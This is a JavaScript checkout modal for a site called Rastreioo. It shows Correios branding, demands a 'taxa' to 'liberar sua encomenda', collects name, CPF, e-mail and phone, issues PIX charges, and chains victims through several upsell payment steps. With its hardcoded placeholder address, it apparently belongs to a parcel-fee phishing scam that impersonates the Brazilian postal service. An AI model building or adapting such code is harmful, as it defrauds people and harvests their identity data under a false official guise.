// Checkout modal dos upsells (up1/up2/up3) - Rastreioo
(function () {
  'use strict';

  var CFG = window.UPSELL || {};
  var API = '/api/pagamento';
  var LEAD_KEY = 'rstr_lead';

  var CTA_RE = /(regularizar agora|pagar frete|realizar pagamento agora)/i;

  function readCookie(name) {
    var m = document.cookie.match('(^|;)\\s*' + name + '\\s*=\\s*([^;]+)');
    return m ? decodeURIComponent(m[2]) : '';
  }

  function params() {
    return new URLSearchParams(window.location.search);
  }

  function somenteDigitos(v) {
    return String(v || '').replace(/\D/g, '');
  }

  function carregarLead() {
    var q = params();
    var lead = {
      nome: (q.get('nome') || '').trim(),
      cpf: somenteDigitos(q.get('cpf')),
      email: (q.get('email') || '').trim(),
      telefone: somenteDigitos(q.get('telefone'))
    };
    try {
      var salvo = JSON.parse(localStorage.getItem(LEAD_KEY) || '{}');
      ['nome', 'cpf', 'email', 'telefone'].forEach(function (k) {
        if (!lead[k] && salvo[k]) lead[k] = salvo[k];
      });
    } catch (e) {}
    return lead;
  }

  function salvarLead(lead) {
    try { localStorage.setItem(LEAD_KEY, JSON.stringify(lead)); } catch (e) {}
  }

  function leadValido(lead) {
    return lead.nome.length >= 3 && lead.cpf.length === 11 && lead.email.indexOf('@') > 0 && lead.telefone.length >= 10;
  }

  function trackingPayload() {
    var t = {};
    try {
      if (window.RastreiooTracking && window.RastreiooTracking.getTrackingParameters) {
        t = window.RastreiooTracking.getTrackingParameters() || {};
      }
    } catch (e) {}
    var q = params();
    ['utm_source', 'utm_campaign', 'utm_medium', 'utm_content', 'utm_term', 'src', 'sck', 'xcod', 'fbclid'].forEach(function (k) {
      if (!t[k] && q.get(k)) t[k] = q.get(k);
    });
    if (!t.fbclid) {
      try {
        var fb = JSON.parse(readCookie('_rstr_fb') || '{}');
        if (fb.fbclid) t.fbclid = fb.fbclid;
      } catch (e) {}
    }
    return t;
  }

  function overlayHtml() {
    return '' +
      '<div class="um-overlay" id="umOverlay" hidden>' +
      '  <div class="um-card" role="dialog" aria-modal="true">' +
      '    <button type="button" class="um-close" id="umClose" aria-label="Fechar">&times;</button>' +
      '    <div class="um-head">' +
      '      <img src="/assets/img/correios-logo.svg" alt="Correios" class="um-logo">' +
      '      <p class="um-title">Pagamento da taxa</p>' +
      '      <p class="um-sub" id="umSub">Finalize para liberar sua encomenda</p>' +
      '    </div>' +
      '    <div class="um-body">' +
      '      <form id="umForm" class="um-form" hidden>' +
      '        <input id="umNome" type="text" placeholder="Nome completo" autocomplete="name">' +
      '        <input id="umCpf" type="text" placeholder="CPF" inputmode="numeric" autocomplete="off">' +
      '        <input id="umEmail" type="email" placeholder="E-mail" autocomplete="email">' +
      '        <input id="umTel" type="tel" placeholder="Celular com DDD" inputmode="numeric" autocomplete="tel">' +
      '        <button type="submit" class="um-btn">Gerar PIX</button>' +
      '      </form>' +
      '      <div id="umLoading" class="um-loading" hidden><span class="um-spinner"></span>Gerando PIX...</div>' +
      '      <div id="umPix" class="um-pix" hidden>' +
      '        <div class="um-value">R$ <span id="umValor">0,00</span></div>' +
      '        <div class="um-qr"><img id="umQr" alt="QR Code PIX" width="220" height="220"></div>' +
      '        <p class="um-hint">Escaneie o QR Code ou copie a chave abaixo</p>' +
      '        <div class="um-code" id="umCode"></div>' +
      '        <button type="button" class="um-btn" id="umCopy">Copiar chave PIX</button>' +
      '        <p class="um-timer" id="umTimer">PIX válido por 15:00</p>' +
      '      </div>' +
      '      <p class="um-error" id="umError" hidden></p>' +
      '    </div>' +
      '  </div>' +
      '</div>';
  }

  var style = document.createElement('style');
  style.textContent = '' +
    '.um-overlay{position:fixed;inset:0;background:rgba(0,0,0,.65);z-index:99999;display:flex;align-items:center;justify-content:center;padding:16px}' +
    '.um-overlay[hidden]{display:none}' +
    '.um-card{background:#fff;border-radius:16px;width:100%;max-width:400px;max-height:92vh;overflow:auto;position:relative;box-shadow:0 25px 60px rgba(0,0,0,.35);font-family:Arial,Helvetica,sans-serif}' +
    '.um-close{position:absolute;right:10px;top:8px;border:0;background:transparent;font-size:26px;line-height:1;color:#64748b;cursor:pointer}' +
    '.um-head{background:#003082;color:#fff;padding:20px 20px 16px;text-align:center;border-radius:16px 16px 0 0}' +
    '.um-logo{height:42px;width:auto;background:#fff;border-radius:6px;padding:4px 8px;margin-bottom:10px}' +
    '.um-title{margin:0;font-size:18px;font-weight:700}' +
    '.um-sub{margin:4px 0 0;font-size:12px;opacity:.85}' +
    '.um-body{padding:18px 20px 22px}' +
    '.um-form input{width:100%;box-sizing:border-box;border:1.5px solid #cbd5e1;border-radius:10px;padding:12px 14px;font-size:14px;margin-bottom:10px;outline:none}' +
    '.um-form input:focus{border-color:#003082}' +
    '.um-btn{width:100%;border:0;border-radius:10px;background:#003082;color:#fff;font-weight:700;font-size:15px;padding:13px 16px;cursor:pointer}' +
    '.um-btn:active{transform:scale(.98)}' +
    '.um-btn[disabled]{opacity:.6;cursor:default}' +
    '.um-loading{display:flex;align-items:center;justify-content:center;gap:10px;color:#334155;font-size:14px;padding:26px 0}' +
    '.um-spinner{width:20px;height:20px;border:3px solid #cbd5e1;border-top-color:#003082;border-radius:50%;display:inline-block;animation:umspin .8s linear infinite}' +
    '@keyframes umspin{to{transform:rotate(360deg)}}' +
    '.um-value{text-align:center;font-size:24px;font-weight:800;color:#003082;margin:0 0 12px}' +
    '.um-qr{text-align:center;margin-bottom:10px}' +
    '.um-qr img{border:1px solid #e2e8f0;border-radius:10px;max-width:100%}' +
    '.um-hint{text-align:center;font-size:12px;color:#64748b;margin:0 0 8px}' +
    '.um-code{font-family:monospace;font-size:11px;color:#334155;background:#f1f5f9;border:1px solid #e2e8f0;border-radius:8px;padding:10px;word-break:break-all;max-height:86px;overflow:auto;margin-bottom:10px}' +
    '.um-timer{text-align:center;font-size:12px;color:#64748b;margin:10px 0 0}' +
    '.um-error{background:#fef2f2;border:1px solid #fecaca;color:#b91c1c;font-size:13px;border-radius:8px;padding:10px;margin:12px 0 0;text-align:center}' +
    '.um-success{background:#f0fdf4;border:1px solid #bbf7d0;color:#15803d;font-size:14px;border-radius:8px;padding:14px;text-align:center;font-weight:700}';

  document.addEventListener('DOMContentLoaded', function () {
    document.head.appendChild(style);
    document.body.insertAdjacentHTML('beforeend', overlayHtml());

    var overlay = document.getElementById('umOverlay');
    var form = document.getElementById('umForm');
    var loading = document.getElementById('umLoading');
    var pixBox = document.getElementById('umPix');
    var errorEl = document.getElementById('umError');
    var codeEl = document.getElementById('umCode');
    var qrEl = document.getElementById('umQr');
    var valorEl = document.getElementById('umValor');
    var timerEl = document.getElementById('umTimer');
    var subEl = document.getElementById('umSub');
    var btnCopy = document.getElementById('umCopy');

    var lead = carregarLead();
    var orderId = null;
    var pollTimer = null;
    var countdown = null;
    var pixCode = '';

    function formataValor(c) {
      return (c / 100).toFixed(2).replace('.', ',');
    }

    function mostrarErro(msg) {
      errorEl.textContent = msg;
      errorEl.hidden = false;
    }

    function esconderErro() {
      errorEl.hidden = true;
    }

    function abrir() {
      overlay.hidden = false;
      esconderErro();
      if (leadValido(lead)) {
        form.hidden = true;
        gerarPix();
      } else {
        form.hidden = false;
        document.getElementById('umNome').value = lead.nome || '';
        document.getElementById('umCpf').value = lead.cpf || '';
        document.getElementById('umEmail').value = lead.email || '';
        document.getElementById('umTel').value = lead.telefone || '';
        valorEl.textContent = formataValor(CFG.valor || 0);
      }
    }

    function fechar() {
      overlay.hidden = true;
      if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
      if (countdown) { clearInterval(countdown); countdown = null; }
    }

    document.getElementById('umClose').addEventListener('click', fechar);
    overlay.addEventListener('click', function (e) {
      if (e.target === overlay) fechar();
    });

    form.addEventListener('submit', function (e) {
      e.preventDefault();
      lead = {
        nome: document.getElementById('umNome').value.trim(),
        cpf: somenteDigitos(document.getElementById('umCpf').value),
        email: document.getElementById('umEmail').value.trim(),
        telefone: somenteDigitos(document.getElementById('umTel').value)
      };
      if (!leadValido(lead)) {
        mostrarErro('Preencha nome, CPF (11 dígitos), e-mail e celular com DDD.');
        return;
      }
      salvarLead(lead);
      esconderErro();
      form.hidden = true;
      gerarPix();
    });

    function gerarPix() {
      esconderErro();
      pixBox.hidden = true;
      loading.hidden = false;
      subEl.textContent = 'Gerando seu PIX...';

      var body = {
        produto: CFG.produto,
        valor: CFG.valor,
        name: lead.nome,
        cpf: lead.cpf,
        email: lead.email,
        telefone: lead.telefone,
        rua: 'SBN Quadra 1',
        numero: '1',
        complemento: 'Regularizacao',
        cep: '70002900',
        bairro: 'Asa Norte',
        cidade: 'Brasilia',
        estado: 'DF',
        trackingParameters: trackingPayload(),
        fbp: readCookie('_fbp') || null,
        fbc: readCookie('_fbc') || null,
        refFbclid: trackingPayload().fbclid || null,
        url: window.location.href
      };

      fetch(API + '?act=invictus_new', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(body)
      }).then(function (r) { return r.json(); }).then(function (data) {
        loading.hidden = true;
        if (data.error || !data.pixCode) {
          mostrarErro(data.error || 'Não foi possível gerar o PIX.');
          subEl.textContent = 'Tente novamente';
          return;
        }
        orderId = data.orderId;
        pixCode = data.pixCode;
        valorEl.textContent = formataValor(CFG.valor || 0);
        codeEl.textContent = pixCode;
        qrEl.src = data.pixQrCode || ('https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=' + encodeURIComponent(pixCode));
        pixBox.hidden = false;
        subEl.textContent = 'Escaneie o QR Code ou copie a chave';
        iniciarTimer();
        iniciarPolling();
      }).catch(function () {
        loading.hidden = true;
        mostrarErro('Falha de conexão. Tente novamente.');
      });
    }

    function iniciarTimer() {
      if (countdown) clearInterval(countdown);
      var sec = 15 * 60;
      timerEl.textContent = 'PIX válido por 15:00';
      countdown = setInterval(function () {
        sec -= 1;
        if (sec <= 0) {
          clearInterval(countdown);
          countdown = null;
          timerEl.textContent = 'PIX expirado';
          return;
        }
        var m = String(Math.floor(sec / 60)).padStart(2, '0');
        var s = String(sec % 60).padStart(2, '0');
        timerEl.textContent = 'PIX válido por ' + m + ':' + s;
      }, 1000);
    }

    function iniciarPolling() {
      if (pollTimer) clearInterval(pollTimer);
      pollTimer = setInterval(function () {
        if (!orderId) return;
        fetch(API + '?act=invictus_check', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ orderId: orderId })
        }).then(function (r) { return r.json(); }).then(function (data) {
          if (!data.paid) return;
          clearInterval(pollTimer);
          pollTimer = null;
          if (window.RastreiooTracking && window.RastreiooTracking.trackPurchase) {
            try { window.RastreiooTracking.trackPurchase(orderId, CFG.valor); } catch (e) {}
          }
          subEl.textContent = 'Pagamento confirmado!';
          pixBox.hidden = true;
          loading.hidden = true;
          esconderErro();
          var ok = document.createElement('p');
          ok.className = 'um-success';
          ok.textContent = 'Pagamento confirmado! Redirecionando...';
          document.querySelector('.um-body').appendChild(ok);
          setTimeout(proximoPasso, 1400);
        }).catch(function () {});
      }, 5000);
    }

    function proximoPasso() {
      var q = params();
      var dados = new URLSearchParams();
      dados.set('nome', lead.nome);
      dados.set('cpf', lead.cpf);
      dados.set('email', lead.email);
      dados.set('telefone', lead.telefone);
      ['codigo', 'utm_source', 'utm_campaign', 'utm_medium', 'utm_content', 'utm_term', 'src', 'sck', 'xcod', 'fbclid'].forEach(function (k) {
        if (q.get(k)) dados.set(k, q.get(k));
      });
      if (CFG.next) {
        window.location.href = '/' + CFG.next + '/?' + dados.toString();
      } else if (q.get('codigo')) {
        window.location.href = '/rastreio.html?codigo=' + encodeURIComponent(q.get('codigo'));
      } else {
        subEl.textContent = 'Tudo certo! Sua encomenda foi liberada.';
      }
    }

    btnCopy.addEventListener('click', function () {
      if (!pixCode) return;
      var done = function () {
        btnCopy.textContent = 'Chave copiada!';
        setTimeout(function () { btnCopy.textContent = 'Copiar chave PIX'; }, 2000);
      };
      if (navigator.clipboard && navigator.clipboard.writeText) {
        navigator.clipboard.writeText(pixCode).then(done).catch(function () {});
      } else {
        var ta = document.createElement('textarea');
        ta.value = pixCode;
        document.body.appendChild(ta);
        ta.select();
        try { document.execCommand('copy'); done(); } catch (e) {}
        document.body.removeChild(ta);
      }
    });

    document.addEventListener('click', function (e) {
      var el = e.target.closest ? e.target.closest('button, a') : null;
      if (!el) return;
      var texto = (el.textContent || '').trim();
      if (!CTA_RE.test(texto)) return;
      e.preventDefault();
      e.stopPropagation();
      abrir();
    }, true);
  });
})();
